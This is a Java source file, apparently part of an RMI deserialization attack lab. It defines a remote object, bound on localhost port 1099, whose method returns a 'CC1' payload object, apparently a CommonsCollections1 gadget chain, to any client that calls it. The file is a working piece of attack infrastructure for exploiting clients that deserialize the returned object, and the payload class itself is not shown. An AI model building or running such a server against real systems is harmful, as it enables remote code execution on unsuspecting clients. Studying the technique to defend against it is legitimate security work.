package org.example.server;

import org.example.payload.CC1;
import org.example.remoteInterface.DangeriousFunc2;

import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class GetobjectServer extends UnicastRemoteObject implements DangeriousFunc2 {
    protected GetobjectServer() throws RemoteException {
    }

    @Override
    public Object getAnytypeParams(Object obj) throws RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        return CC1.getObject();
    }
    public static void main(String[] args) throws RemoteException, MalformedURLException {
        GetobjectServer getobjectServer = new GetobjectServer();
        String host = "rmi://127.0.0.1:1099/";
        Naming.rebind(host+"getobjectServer", getobjectServer);
    }
}
